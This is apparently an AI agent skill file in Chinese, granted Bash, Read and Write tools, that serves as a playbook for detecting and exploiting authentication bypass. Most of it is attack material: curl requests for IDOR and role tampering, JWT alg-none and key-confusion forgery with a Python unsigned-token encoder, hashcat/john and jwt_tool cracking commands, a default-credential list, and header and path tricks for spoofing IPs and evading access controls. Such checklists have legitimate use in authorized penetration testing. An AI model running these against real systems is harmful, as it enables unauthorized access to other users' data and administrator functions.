---
name: auth-bypass
description: 认证绕过漏洞检测与利用。当目标存在登录功能、权限控制、JWT/Session 认证时使用。包括 IDOR、越权访问等。
allowed-tools: Bash, Read, Write
---

# 认证绕过 (Authentication Bypass)

绕过应用程序的认证和授权机制，获取未授权访问。

## 常见指示器

- 登录/注册功能
- 用户 ID 参数（user_id=, uid=, id=）
- JWT Token
- Session Cookie
- 角色/权限参数（role=, is_admin=, level=）
- API 端点（/api/admin/, /api/user/）

## 检测方法

### 1. IDOR 测试

```bash
# 修改用户 ID
curl "http://target.com/api/user/1" -H "Cookie: session=xxx"
curl "http://target.com/api/user/2" -H "Cookie: session=xxx"

# 修改资源 ID
curl "http://target.com/api/order/1001" -H "Cookie: session=xxx"
curl "http://target.com/api/order/1002" -H "Cookie: session=xxx"
```

### 2. 权限参数测试

```bash
# 修改角色参数
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","role":"admin"}'

# 修改权限标志
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","is_admin":true}'
```

## 攻击向量

### IDOR (不安全的直接对象引用)

```bash
# 水平越权 - 访问其他用户数据
/api/user/1 → /api/user/2
/api/order/1001 → /api/order/1002
/download?file=user1.pdf → /download?file=user2.pdf

# 垂直越权 - 访问管理员功能
/api/user/profile → /api/admin/users
/dashboard → /admin/dashboard

# 参数污染
/api/user?id=1 → /api/user?id=1&id=2
/api/user?id[]=1 → /api/user?id[]=1&id[]=2
```

### 权限参数篡改

```json
// 修改角色
{"username":"test","role":"user"} → {"username":"test","role":"admin"}

// 修改权限标志
{"username":"test","is_admin":false} → {"username":"test","is_admin":true}

// 修改用户级别
{"username":"test","level":1} → {"username":"test","level":99}

// 添加隐藏参数
{"username":"test"} → {"username":"test","admin":true}
```

### JWT 攻击

```bash
# 1. 修改算法为 none
# Header: {"alg":"none","typ":"JWT"}
# 移除签名部分

# 2. 修改算法 RS256 → HS256
# 使用公钥作为 HMAC 密钥签名

# 3. 弱密钥爆破
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# 4. 修改 payload
# 解码 → 修改 user_id/role → 重新编码
```

### Session 攻击

```bash
# Session 固定
# 1. 获取未认证 session
# 2. 诱导用户使用该 session 登录
# 3. 使用同一 session 访问

# Session 预测
# 分析 session 生成规律，预测有效 session

# Session 劫持
# 通过 XSS 窃取 session cookie
```

### 默认凭据

```
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
user:user
administrator:administrator
```

### HTTP 方法绕过

```bash
# 尝试不同 HTTP 方法
curl -X GET "http://target.com/admin"
curl -X POST "http://target.com/admin"
curl -X PUT "http://target.com/admin"
curl -X DELETE "http://target.com/admin"
curl -X PATCH "http://target.com/admin"
curl -X OPTIONS "http://target.com/admin"
curl -X HEAD "http://target.com/admin"

# 方法覆盖
curl -X POST "http://target.com/admin" -H "X-HTTP-Method-Override: PUT"
curl -X POST "http://target.com/admin" -H "X-Method-Override: PUT"
```

### 路径绕过

```bash
# 大小写
/admin → /Admin → /ADMIN

# 路径遍历
/admin → /./admin → /../admin/

# URL 编码
/admin → /%61%64%6d%69%6e

# 双斜杠
/admin → //admin → /admin//

# 添加扩展名
/admin → /admin.json → /admin.html

# 添加参数
/admin → /admin?anything → /admin#anything
```

## JWT 工具使用

### jwt_tool

```bash
# 解码 JWT
python3 jwt_tool.py <JWT>

# 测试所有攻击
python3 jwt_tool.py <JWT> -M at

# 修改 payload
python3 jwt_tool.py <JWT> -T

# 爆破密钥
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

### 手动 JWT 操作

```python
import base64
import json

# 解码
def decode_jwt(token):
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

# 编码 (无签名)
def encode_jwt_none(payload):
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    return f"{h.decode()}.{p.decode()}."
```

## 绕过技术

### 前端验证绕过

```bash
# 直接调用 API，绕过前端检查
curl "http://target.com/api/admin/users" -H "Cookie: session=xxx"

# 修改响应中的权限标志
# 使用 Burp 修改响应: {"is_admin":false} → {"is_admin":true}
```

### IP 限制绕过

```bash
# 添加 IP 头
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Referer 检查绕过

```bash
# 添加 Referer 头
Referer: http://target.com/admin
Referer: http://target.com/

# 空 Referer
Referer:
```

## 最佳实践

1. 先枚举所有 API 端点和参数
2. 测试 IDOR：修改 ID 参数访问其他用户数据
3. 测试权限参数：添加 role、is_admin 等参数
4. 分析 JWT/Session：尝试修改或伪造
5. 尝试不同 HTTP 方法和路径变形
6. 检查前端 JS 中的隐藏 API 和参数
7. 使用 Burp 拦截并修改请求/响应
